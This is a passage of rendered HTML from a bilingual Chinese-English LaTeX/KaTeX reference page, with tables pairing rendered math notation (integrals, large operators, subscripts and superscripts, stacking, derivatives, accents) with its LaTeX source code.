x^3, dx + 4y^2, dy</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∮</mo><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>C</mi></mrow></msub><msup><mi>x</mi><mn>3</mn></msup><mtext> </mtext><mi>d</mi><mi>x</mi><mo>+</mo><mn>4</mn><msup><mi>y</mi><mn>2</mn></msup><mtext> </mtext><mi>d</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">\oint_{(x,y)\in C} x^3\, dx + 4y^2\, dy</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.344928em;vertical-align:-0.5308200000000001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∮</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16917999999999989em;"><span style="top:-2.3441799999999997em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5308200000000001em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">4</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></td><td style="text-align:left">\oint_{(x,y)\in C} x^3, dx + 4y^2, dy</td></tr></tbody></table><p>**注意：**积分符号可以使用<code>\int_&#123;&#125;^&#123;&#125;</code>命令调用，如需双重积分符号只需将<code>int</code>替换成<code>iint</code>即可，以此类推，最高支持四重。</p><h3 id="229-其他大型运算-large-operators"><a class="markdownIt-Anchor" href="#229-其他大型运算-large-operators"></a> 2.2.9 其他大型运算 Large operators</h3><table><thead><tr><th style="text-align:left">类别</th><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left">求和 Summation</td><td style="text-align:left">$$\sum_{a}^{b}$$</td><td style="text-align:left">\sum_{a}^{b}</td></tr><tr><td style="text-align:left">求和 Summation</td><td style="text-align:left">$$\textstyle \sum_{a}^{b}$$</td><td style="text-align:left">\textstyle \sum_{a}^{b}</td></tr><tr><td style="text-align:left">连乘积 Product</td><td style="text-align:left">$$\prod_{a}^{b}$$</td><td style="text-align:left">\prod_{a}^{b}</td></tr><tr><td style="text-align:left">连乘积 Product</td><td style="text-align:left">$$\textstyle \prod_{a}^{b}$$</td><td style="text-align:left">\textstyle \prod_{a}^{b}</td></tr><tr><td style="text-align:left">余积 Coproduct</td><td style="text-align:left">$$\coprod_{a}^{b}$$</td><td style="text-align:left">\coprod_{a}^{b}</td></tr><tr><td style="text-align:left">余积 Coproduct</td><td style="text-align:left">$$\textstyle \coprod_{a}^{b}$$</td><td style="text-align:left">\textstyle \coprod_{a}^{b}</td></tr><tr><td style="text-align:left">并集 Union</td><td style="text-align:left">$$\bigcup_{a}^{b}$$</td><td style="text-align:left">\bigcup_{a}^{b}</td></tr><tr><td style="text-align:left">并集 Union</td><td style="text-align:left">$$\textstyle \bigcup_{a}^{b}$$</td><td style="text-align:left">\textstyle \bigcup_{a}^{b}</td></tr><tr><td style="text-align:left">交集 Intersection</td><td style="text-align:left">$$\bigcap_{a}^{b}$$</td><td style="text-align:left">\bigcap_{a}^{b}</td></tr><tr><td style="text-align:left">交集 Intersection</td><td style="text-align:left">$$\textstyle \bigcap_{a}^{b}$$</td><td style="text-align:left">\textstyle \bigcap_{a}^{b}</td></tr><tr><td style="text-align:left">析取 Disjunction</td><td style="text-align:left">$$\bigvee_{a}^{b}$$</td><td style="text-align:left">\bigvee_{a}^{b}</td></tr><tr><td style="text-align:left">析取 Disjunction</td><td style="text-align:left">$$\textstyle \bigvee_{a}^{b}$$</td><td style="text-align:left">\textstyle \bigvee_{a}^{b}</td></tr><tr><td style="text-align:left">合取 Conjunction</td><td style="text-align:left">$$\bigwedge_{a}^{b}$$</td><td style="text-align:left">\bigwedge_{a}^{b}</td></tr><tr><td style="text-align:left">合取 Conjunction</td><td style="text-align:left">$$\textstyle \bigwedge_{a}^{b}$$</td><td style="text-align:left">\textstyle \bigwedge_{a}^{b}</td></tr></tbody></table><h2 id="23-上下标-sub-super"><a class="markdownIt-Anchor" href="#23-上下标-sub-super"></a> 2.3 上下标 Sub &amp; Super</h2><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">样式</th><th style="text-align:left">代码</th></tr></thead><tbody><tr><td style="text-align:left">上标 Superscript</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mn>2</mn></msup><mo separator="true">,</mo><msup><mi>a</mi><mrow><mi>x</mi><mo>+</mo><mn>3</mn></mrow></msup></mrow><annotation encoding="application/x-tex">a^2, a^{x+3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mbin mtight">+</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">a^2, a^{x+3}</td></tr><tr><td style="text-align:left">下标 Subscript</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">a_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">a_2</td></tr><tr><td style="text-align:left">组合 Grouping</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>30</mn></msup><msup><mi>a</mi><mrow><mn>2</mn><mo>+</mo><mn>2</mn></mrow></msup></mrow><annotation encoding="application/x-tex">10^{30} a^{2+2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">10^{30} a^{2+2}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><msub><mi>b</mi><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msub></mrow><annotation encoding="application/x-tex">a_{i,j} b_{f&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828285714285715em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">a_{i,j} b_{f’}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">上下标混合Combining sub &amp; super without and with horizontal separation</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mn>2</mn><mn>3</mn></msubsup></mrow><annotation encoding="application/x-tex">x_2^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">x_2^3</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><msub><mi>x</mi><mn>2</mn></msub><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">{x_2}^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">{x_2}^3</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">上标的上标 Super super</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mrow><mn>1</mn><msup><mn>0</mn><mn>8</mn></msup></mrow></msup></mrow><annotation encoding="application/x-tex">10^{10^{8}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9869199999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">10<sup>{10</sup>{8}}</td></tr><tr><td style="text-align:left">混合标识 Preceding and/or additional sub &amp; super</td><td style="text-align:left"><span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \sideset at position 1: \̲s̲i̲d̲e̲s̲e̲t̲{_1^2}{_3^4}X_a…'>\sideset{_1^2}{_3^4}X_a^b</span></td><td style="text-align:left">\sideset{_1<sup>2}{_3</sup>4}X_a^b</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mrow></mrow><mn>1</mn><mn>2</mn></msubsup><mtext> ⁣</mtext><msubsup><mi mathvariant="normal">Ω</mi><mn>3</mn><mn>4</mn></msubsup></mrow><annotation encoding="application/x-tex">{}_1^2\!\Omega_3^4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord"></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:-0.16666666666666666em;"></span><span class="mord"><span class="mord">Ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">{}_1<sup>2!\Omega_3</sup>4</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">顶标底标 Stacking</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mover><mo><mi>ω</mi></mo><mi>α</mi></mover></mi></mrow><annotation encoding="application/x-tex">\overset{\alpha}{\omega}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.031952em;vertical-align:0em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.031952em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop mathnormal" style="margin-right:0.03588em;">ω</span></span></span><span style="top:-3.63056em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overset{\alpha}{\omega}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><munder><mo><mi>ω</mi></mo><mi>α</mi></munder></mi></mrow><annotation encoding="application/x-tex">\underset{\alpha}{\omega}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.13056em;vertical-align:-0.7em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.43056em;"><span style="top:-2.4em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop mathnormal" style="margin-right:0.03588em;">ω</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\underset{\alpha}{\omega}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mover><mo><mi><munder><mo><mi>ω</mi></mo><mi>γ</mi></munder></mi></mo><mi>α</mi></mover></mi></mrow><annotation encoding="application/x-tex">\overset{\alpha}{\underset{\gamma}{\omega}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.8680599999999998em;vertical-align:-0.8361080000000001em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0319519999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4305599999999999em;"><span style="top:-2.4em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05556em;">γ</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop mathnormal" style="margin-right:0.03588em;">ω</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8361080000000001em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.63056em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8361080000000001em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overset{\alpha}{\underset{\gamma}{\omega}}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo><mover><mo><mi>ω</mi></mo><mi>α</mi></mover></mo></mrow><annotation encoding="application/x-tex">\stackrel{\alpha}{\omega}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.066672em;vertical-align:0em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.066672em;"><span style="top:-3.03472em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop mathnormal" style="margin-right:0.03588em;">ω</span></span></span><span style="top:-3.66528em;margin-left:0.03588em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\stackrel{\alpha}{\omega}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">导数 Derivatives</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>y</mi><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><mo separator="true">,</mo><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>f</mi><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup></mrow><annotation encoding="application/x-tex">x&#x27;, y&#x27;&#x27;, f&#x27;, f&#x27;&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">x’, y’‘, f’, f’’</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal">′</mo></msup><mo separator="true">,</mo><msup><mi>y</mi><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup></mrow><annotation encoding="application/x-tex">x^\prime, y^{\prime\prime}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">x^\prime, y^{\prime\prime}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">导数Derivative dots</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>x</mi><mo>˙</mo></mover><mo separator="true">,</mo><mover accent="true"><mi>x</mi><mo>¨</mo></mover></mrow><annotation encoding="application/x-tex">\dot{x}, \ddot{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8623000000000001em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.11111000000000001em;"><span class="mord">˙</span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;"><span class="mord">¨</span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\dot{x}, \ddot{x}</td></tr><tr><td style="text-align:left">下划线、上划线与向量<br>Underlines, overlines, vectors</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>a</mi><mo>^</mo></mover><mtext> </mtext><mover accent="true"><mi>b</mi><mo>ˉ</mo></mover><mtext> </mtext><mover accent="true"><mi>c</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\hat a \ \bar b \ \vec c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8312199999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">a</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8312199999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">b</span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">c</span></span><span style="top:-3em;"><span class="pstrut" 